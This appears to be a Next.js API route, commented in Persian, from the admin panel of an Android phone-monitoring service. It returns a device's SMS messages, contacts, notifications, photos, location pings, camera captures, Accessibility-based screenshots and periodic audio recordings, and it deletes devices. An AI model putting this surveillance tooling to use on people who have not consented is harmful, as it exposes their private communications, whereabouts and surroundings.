import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import { isAdminRequest, unauthorizedResponse } from "@/lib/auth";
import { dayKeyToStart, daysAgoKey } from "@/lib/days";

/**
 * جزئیات کامل یک دستگاه:
 * برنامه‌ها، مصرف ۱۴ روز اخیر، رویدادها، پیامک‌ها، اعلان‌ها و گالری
 */
export async function GET(
  _req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  if (!(await isAdminRequest())) return unauthorizedResponse();
  const { id } = await params;

  const device = await db.device.findUnique({
    where: { id },
    include: {
      apps: { orderBy: { label: "asc" } },
      usage: { where: { day: { gte: dayKeyToStart(daysAgoKey(13)) } } },
      events: { orderBy: { createdAt: "desc" }, take: 50 },
      sms: { orderBy: { at: "desc" }, take: 150 },
      notifications: { orderBy: { at: "desc" }, take: 100 },
      photos: { orderBy: { takenAt: "desc" }, take: 240 },
      contacts: { orderBy: { name: "asc" }, take: 2000 },
      pings: { orderBy: { at: "desc" }, take: 30 },
      captures: { orderBy: { takenAt: "desc" }, take: 60 },
      screens: { orderBy: { takenAt: "desc" }, take: 24 },
      audioClips: { orderBy: { recordedAt: "desc" }, take: 24 },
    },
  });

  if (!device) {
    return NextResponse.json({ error: "دستگاه پیدا نشد" }, { status: 404 });
  }

  const [smsCount, notifCount, photoCount, contactCount, captureCount, pendingCount, screenCount, audioCount] =
    await Promise.all([
      db.smsMessage.count({ where: { deviceId: device.id } }),
      db.notificationItem.count({ where: { deviceId: device.id } }),
      db.photoEntry.count({ where: { deviceId: device.id } }),
      db.contactEntry.count({ where: { deviceId: device.id } }),
      db.capturePhoto.count({ where: { deviceId: device.id } }),
      db.deviceCommand.count({
        where: { deviceId: device.id, status: "PENDING" },
      }),
      db.screenCapture.count({ where: { deviceId: device.id } }),
      db.audioClip.count({ where: { deviceId: device.id } }),
    ]);

  return NextResponse.json({
    device: {
      id: device.id,
      name: device.name,
      model: device.model,
      androidVersion: device.androidVersion,
      appVersion: device.appVersion,
      battery: device.battery,
      lastSeenAt: device.lastSeenAt,
      lastSyncAt: device.lastSyncAt,
      createdAt: device.createdAt,
    },
    apps: device.apps.map((a) => ({
      id: a.id,
      packageName: a.packageName,
      label: a.label,
      controlled: a.controlled,
    })),
    usage: device.usage.map((u) => ({
      day: u.day.toISOString().slice(0, 10),
      packageName: u.packageName,
      minutes: u.minutes,
    })),
    events: device.events.map((e) => ({
      id: e.id,
      type: e.type,
      message: e.message,
      createdAt: e.createdAt,
    })),
    sms: device.sms.map((s) => ({
      id: s.id,
      smsId: s.smsId,
      address: s.address,
      body: s.body,
      type: s.type,
      at: s.at,
    })),
    notifications: device.notifications.map((n) => ({
      id: n.id,
      packageName: n.packageName,
      title: n.title,
      text: n.text,
      at: n.at,
    })),
    photos: device.photos.map((p) => ({
      id: p.id,
      mediaId: p.mediaId,
      takenAt: p.takenAt,
      size: p.size,
      bucket: p.bucket,
      hasThumb: p.thumb != null,
    })),
    contacts: device.contacts.map((c) => ({
      id: c.id,
      name: c.name,
      phones: c.phones,
    })),
    location: device.locAt
      ? {
          lat: device.locLat as number,
          lng: device.locLng as number,
          accuracy: device.locAccuracy,
          provider: device.locProvider,
          at: device.locAt,
        }
      : null,
    pings: device.pings.map((p) => ({
      id: p.id,
      lat: p.lat,
      lng: p.lng,
      accuracy: p.accuracy,
      provider: p.provider,
      at: p.at,
    })),
    captures: device.captures.map((c) => ({
      id: c.id,
      takenAt: c.takenAt,
    })),
    // پایش صفحه — وضعیت فعلی و آخرین ۲۴ اسکرین‌شات
    screenMonitor: {
      enabled: device.screenMonitorEnabled,
      startedAt: device.screenMonitorStartedAt,
      interval: 10,
      // آیا سرویس Accessibility روی گوشی فعال است؟ (پایش صفحه فقط با Accessibility کار می‌کند)
      accessibilityEnabled: device.accessibilityEnabled,
    },
    // ضبط صدا — وضعیت فعلی و آخرین ۲۴ قطعه‌ی صوتی
    audioMonitor: {
      enabled: device.audioMonitorEnabled,
      startedAt: device.audioMonitorStartedAt,
      interval: 10,
    },
    audioClips: (device.audioClips || []).map((a) => ({
      id: a.id,
      recordedAt: a.recordedAt,
      durationSec: a.durationSec,
      mimeType: a.mimeType,
    })),
    screens: device.screens.map((s) => ({
      id: s.id,
      takenAt: s.takenAt,
    })),
    counts: {
      sms: smsCount,
      notifs: notifCount,
      photos: photoCount,
      contacts: contactCount,
      captures: captureCount,
      pendingCommands: pendingCount,
      screens: screenCount,
      audioClips: audioCount,
    },
  });
}

/**
 * حذف دستگاه و تمام داده‌های مرتبط با آن.
 * بسته به اسکیمای Prisma همه‌ی روابط (apps, usage, events, sms, notifications,
 * photos, contacts, commands, captures, pings) با onDelete: Cascade حذف می‌شوند.
 * کدهای جفت‌سازیِ استفاده‌شده برای این دستگاه نیز به حالت «استفاده‌نشده» برمی‌گردند
 * تا در صورت لزوم قابل استفاده مجدد باشند (چون PairingCode رابطه‌ی FK ندارد).
 */
export async function DELETE(
  _req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  if (!(await isAdminRequest())) return unauthorizedResponse();
  const { id } = await params;

  const device = await db.device.findUnique({
    where: { id },
    select: { id: true, name: true },
  });
  if (!device) {
    return NextResponse.json({ error: "دستگاه پیدا نشد" }, { status: 404 });
  }

  // همه‌ی داده‌ها در یک تراکنش حذف می‌شوند تا در صورت خطا چیزی نیمه‌کاره نماند
  await db.$transaction(async (tx) => {
    // کدهای جفت‌سازیِ این دستگاه را آزاد کن (deviceId را null کن)
    // تا در صورت لزوم قابل استفاده مجدد باشند
    await tx.pairingCode.updateMany({
      where: { deviceId: id },
      data: { deviceId: null },
    });
    // خود دستگاه را حذف کن — همه‌ی روابط به‌صورت Cascade حذف می‌شوند
    await tx.device.delete({ where: { id } });
  });

  return NextResponse.json({ ok: true });
}
